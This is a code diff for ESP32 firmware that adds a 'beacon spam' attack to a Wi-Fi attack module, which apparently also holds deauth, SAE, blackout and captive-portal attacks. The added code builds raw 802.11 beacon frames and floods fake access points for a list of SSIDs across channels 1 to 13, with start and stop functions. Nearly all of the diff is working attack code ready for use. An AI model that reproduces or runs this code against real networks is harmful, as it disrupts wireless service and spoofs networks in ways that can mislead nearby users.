@@ -48,6 +48,13 @@ static volatile bool blackout_attack_active = false;
 static TaskHandle_t sae_attack_task_handle = NULL;
 static volatile bool sae_attack_active = false;
 
+// Beacon spam state (fake AP flood)
+#define MAX_BEACON_SSIDS 32
+static TaskHandle_t beacon_spam_task_handle = NULL;
+static volatile bool beacon_spam_active = false;
+static char beacon_ssids[MAX_BEACON_SSIDS][33];
+static int  beacon_ssid_count = 0;
+
 static httpd_handle_t portal_server = NULL;
 static volatile bool portal_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
@@ -356,6 +363,122 @@ static void deauth_attack_task(void *pvParameters) {
     deauth_attack_task_handle = NULL;
     vTaskDelete(NULL);
 }
+
+// ============================================================================
+// Beacon spam — flood fake AP beacons for a list of SSIDs across 2.4GHz channels.
+// Ported from projectZero. Uses raw 802.11 TX on the AP interface (like deauth).
+// ============================================================================
+
+// Build an 802.11 beacon frame for `ssid` advertised by `bssid` on `channel`.
+// Returns the frame length, or 0 on bad args. buffer must be >= 200 bytes.
+static int build_beacon_frame(uint8_t *buf, size_t bufsz, const char *ssid,
+                              const uint8_t *bssid, uint8_t channel)
+{
+    if (!buf || !ssid || !bssid || bufsz < 200) return 0;
+    int ssid_len = (int)strlen(ssid);
+    if (ssid_len > 32) ssid_len = 32;
+
+    int pos = 0;
+    buf[pos++] = 0x80; buf[pos++] = 0x00;          // FC: mgmt/beacon
+    buf[pos++] = 0x00; buf[pos++] = 0x00;          // Duration
+    memset(&buf[pos], 0xFF, 6); pos += 6;          // DA: broadcast
+    memcpy(&buf[pos], bssid, 6); pos += 6;         // SA
+    memcpy(&buf[pos], bssid, 6); pos += 6;         // BSSID
+    buf[pos++] = 0x00; buf[pos++] = 0x00;          // Seq ctrl
+
+    uint64_t ts = esp_timer_get_time();
+    memcpy(&buf[pos], &ts, 8); pos += 8;           // Timestamp
+    buf[pos++] = 0x64; buf[pos++] = 0x00;          // Beacon interval (100 TU)
+    buf[pos++] = 0x01; buf[pos++] = 0x00;          // Capability (ESS)
+
+    buf[pos++] = 0x00; buf[pos++] = (uint8_t)ssid_len;   // SSID tag
+    memcpy(&buf[pos], ssid, ssid_len); pos += ssid_len;
+
+    buf[pos++] = 0x01; buf[pos++] = 0x08;          // Supported rates
+    buf[pos++] = 0x82; buf[pos++] = 0x84; buf[pos++] = 0x8B; buf[pos++] = 0x96;
+    buf[pos++] = 0x24; buf[pos++] = 0x30; buf[pos++] = 0x48; buf[pos++] = 0x6C;
+
+    buf[pos++] = 0x03; buf[pos++] = 0x01; buf[pos++] = channel;  // DS param (channel)
+    return pos;
+}
+
+static void send_beacon_frame(const uint8_t *buf, int size)
+{
+    if (!buf || size <= 0) return;
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, buf, size, false);
+    if (err == ESP_ERR_NO_MEM) vTaskDelay(pdMS_TO_TICKS(20));
+}
+
+static void beacon_spam_task(void *pv)
+{
+    (void)pv;
+    const uint8_t first_channel = 1, last_channel = 13;
+    const uint8_t bssid[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 };
+    uint8_t frame[256];
+
+    ESP_LOGI(TAG, "Beacon spam started (%d SSIDs, ch %u-%u)",
+             beacon_ssid_count, first_channel, last_channel);
+
+    while (beacon_spam_active) {
+        for (uint8_t ch = first_channel; ch <= last_channel && beacon_spam_active; ch++) {
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(10));
+            for (int i = 0; i < beacon_ssid_count && beacon_spam_active; i++) {
+                int n = build_beacon_frame(frame, sizeof(frame), beacon_ssids[i], bssid, ch);
+                if (n > 0) send_beacon_frame(frame, n);
+                vTaskDelay(pdMS_TO_TICKS(10));
+            }
+        }
+    }
+
+    ESP_LOGI(TAG, "Beacon spam stopped");
+    beacon_spam_active = false;
+    beacon_spam_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+esp_err_t wifi_attacks_start_beacon_spam(const char **ssids, int count)
+{
+    if (beacon_spam_active) return ESP_ERR_INVALID_STATE;
+    if (!ssids || count <= 0) return ESP_ERR_INVALID_ARG;
+
+    beacon_ssid_count = 0;
+    for (int i = 0; i < count && beacon_ssid_count < MAX_BEACON_SSIDS; i++) {
+        if (!ssids[i] || !ssids[i][0]) continue;
+        strncpy(beacon_ssids[beacon_ssid_count], ssids[i], 32);
+        beacon_ssids[beacon_ssid_count][32] = '\0';
+        beacon_ssid_count++;
+    }
+    if (beacon_ssid_count == 0) return ESP_ERR_INVALID_ARG;
+
+    // Ensure the AP interface exists for raw TX (APSTA), like the deauth path.
+    wifi_mode_t mode;
+    esp_wifi_get_mode(&mode);
+    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_AP) {
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    beacon_spam_active = true;
+    if (xTaskCreate(beacon_spam_task, "beacon_spam", 4096, NULL, 3,
+                    &beacon_spam_task_handle) != pdPASS) {
+        beacon_spam_active = false;
+        return ESP_FAIL;
+    }
+    ESP_LOGI(TAG, "Beacon spam: %d SSID(s) queued", beacon_ssid_count);
+    return ESP_OK;
+}
+
+esp_err_t wifi_attacks_stop_beacon_spam(void)
+{
+    if (!beacon_spam_active) return ESP_ERR_INVALID_STATE;
+    beacon_spam_active = false;
+    for (int i = 0; i < 40 && beacon_spam_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(25));
+    return ESP_OK;
+}
+
+bool wifi_attacks_is_beacon_spam_active(void) { return beacon_spam_active; }
 
 esp_err_t wifi_attacks_start_deauth(void) {
     if (deauth_attack_active) {
